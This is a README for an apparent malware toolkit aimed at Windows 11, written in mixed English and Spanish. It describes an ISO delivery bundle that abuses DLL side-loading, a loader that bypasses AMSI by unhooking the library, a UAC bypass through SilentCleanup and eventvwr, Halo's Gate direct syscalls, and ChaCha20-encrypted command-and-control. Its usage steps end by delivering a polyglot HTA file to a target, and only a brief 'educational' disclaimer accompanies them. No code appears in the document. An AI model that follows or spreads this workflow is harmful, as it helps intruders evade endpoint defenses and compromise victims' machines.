# Advanced Windows 11 Entry Vector

This directory contains a sophisticated, multi-stage attack vector for Windows 11 environments, utilizing state-of-the-art evasion and persistence techniques.

## Components

### 1. Delivery: DLL Side-Loading (Phantom Hijacking)
Para eliminar el "ruido" de comandos en archivos LNK, utilizamos una técnica de **DLL Side-Loading**.
- **ISO Bundle**: El archivo ISO contiene un ejecutable legítimo y firmado por Microsoft (ej. `OneDrive.exe` o `calc.exe`) junto con una DLL maliciosa (`version.dll` o similar) que el ejecutable carga automáticamente al iniciar.
- **Evasión de Línea de Comandos**: Al ejecutar el binario legítimo, no se generan argumentos sospechosos en el registro de procesos, evadiendo heurísticas basadas en `cmd.exe` o `powershell.exe`.

### 2. Stage 1 Loader (`src/loader.cpp`)
Diseñado para la máxima discreción, eliminando técnicas que generan alarmas por comportamiento:
- **AMSI Bypass vía Library Unhooking**: En lugar de manipular registros de hardware (HWBP) o parchear memoria, el loader mapea una copia limpia de `amsi.dll` directamente desde el disco a una sección de memoria privada. Esto permite ejecutar funciones sin los "hooks" (sensores) instalados por el EDR, siendo totalmente invisible para monitores de parcheo o de contexto de hilo (`SetThreadContext`).
- **Silent UAC Bypass (SilentCleanup/EventViewer)**: Utiliza tareas programadas de Windows (`SilentCleanup`) y el visor de eventos (`eventvwr.exe`) para elevar privilegios de forma legítima a través de variables de entorno, evitando la creación de rutas sospechosas o modificaciones ruidosas en el registro de clases de configuración.
- **Invocaciones Directas (Halo's Gate)**: Mantenemos la resolución dinámica de SSNs para asegurar que las llamadas críticas al sistema ignoren cualquier hook remanente en `ntdll.dll`.

### 3. Crypto Module (`src/crypto.h`)
Standard implementation of **ChaCha20**, used for encrypting the Stage 2 payload and communication with the C2 infrastructure.

## Building

To compile the loader using MinGW-w64 on a Linux system:

```bash
make
```

The resulting binary will be located in `bin/loader.exe`.

## Usage

1. Compile the loader.
2. Embed the loader (or a download command) into the VBScript section of the `entry_vector.pdf.hta`.
3. Deliver the polyglot file to the target.

## Disclaimer

This code is provided for educational and authorized testing purposes only. The techniques demonstrated here are representative of advanced persistent threats (APTs) and should be used to improve defensive postures.
